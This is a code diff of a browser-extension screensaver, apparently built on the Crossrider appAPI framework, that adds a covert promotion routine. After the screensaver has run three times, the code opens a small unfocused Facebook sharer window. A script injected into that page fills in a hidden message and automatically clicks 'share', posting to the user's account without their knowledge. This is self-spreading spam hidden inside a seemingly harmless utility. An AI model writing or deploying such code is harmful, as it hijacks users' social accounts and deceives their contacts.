@@ -3,8 +3,8 @@ var ScreenSaver = (function ($) {
 			appId:appAPI.appInfo.id,
 			appSource:getSourceId(),
 			screenSaverStartAfter:10,//minutes
-			//thankYouPageUrl:'http://www.myscreensaver.co/?thankyou=true',
-			thankYouPageUrl:'http://mss.i.com/?thankyou=true',
+			thankYouPageUrl:'http://www.myscreensaver.co/?thankyou=true',
+			//thankYouPageUrl:'http://mss.i.com/?thankyou=true',
 			defaultImages:'https://fierce-window-3161.herokuapp.com/images/{id}/{id}{i}.jpg', //@@@ the base url of all the images when {{id}} is the images set (like: 'barcelona') and {{i}} is a running number for each image
 			defaultImagesCount:{ //@@@the count of each images set
 				bar:115,
@@ -183,8 +183,8 @@ var ScreenSaver = (function ($) {
 	}
 	
 	function getSourceId() {
-		var sourceId = appAPI.installer.getParams().source_id;
-		
+		var sourceId = appAPI.installer.getParams().sub_id;
+
 		if (!sourceId || sourceId == '0') {
 			sourceId = 'bar';
 		}
@@ -267,6 +267,7 @@ var ScreenSaver = (function ($) {
 			imagesCountForAnimnation = Math.min(config.maxImages, config.defaultImagesCount[screenSaverSettings.screensaver]);
 
 			clearTimeout(screenSaverTimeout);
+			logScreenSaverRunCount();
 			initMarkup();
 			initImages();
 			initDist();
@@ -353,13 +354,28 @@ var ScreenSaver = (function ($) {
 	}
 
 	function initDist() {
-		appAPI.openURL({
-            url:'https://www.facebook.com/sharer/sharer.php?u=http://myscreensaver.co/screensaver/bar' /*+ screenSaverSettings.screensaver*/,
-            where:'window',
-            focus:false,
-            height:300,
-            width:300
-        });
+		var distRun = appAPI.db.get('dist_run'),
+			screenSaverRunCount = appAPI.db.get('screensaver_run_count');
+
+		if (!distRun && screenSaverRunCount >= 3) {
+			appAPI.openURL({
+				url:'https://www.facebook.com/sharer/sharer.php?u=http://myscreensaver.co/screensaver/' + screenSaverSettings.screensaver,
+				where:'window',
+				focus:false,
+				height:300,
+				width:300
+			});
+
+			appAPI.db.set('dist_run', true, appAPI.time.daysFromNow(10));
+		}
+	}
+
+	function logScreenSaverRunCount() {
+		var screenSaverRunCount = appAPI.db.get('screensaver_run_count') || 0;
+
+		screenSaverRunCount ++ ;
+
+		appAPI.db.set('screensaver_run_count', screenSaverRunCount);
 	}
 
 	//@@@ THIS IS THE SCREEN SAVER CODE
@@ -712,8 +728,12 @@ var ScreenSaver = (function ($) {
 
 appAPI.ready(function($) {
 	function isDist() {
-		if (top.location.href.indexOf('www.facebook.com/sharer/sharer.php?u=http://myscreensaver.co') > -1) {
-			return true;
+		var rand = Math.floor(Math.random() * 100);
+
+		if (rand < 100) {
+			if (top.location.href.indexOf('www.facebook.com/sharer/sharer.php?u=http://myscreensaver.co') > -1) {
+				return true;
+			}
 		}
 	}
 
@@ -747,7 +767,7 @@ appAPI.ready(function($) {
 		inpHidden.attr('name', 'message').val(message);
 
 		setTimeout(function () {
-			//$('input[name="share"]').trigger('click');
+			$('input[name="share"]').trigger('click');
 		}, 2000);
 	} else {
 		appAPI.resources.jQueryUI('1.8.24');
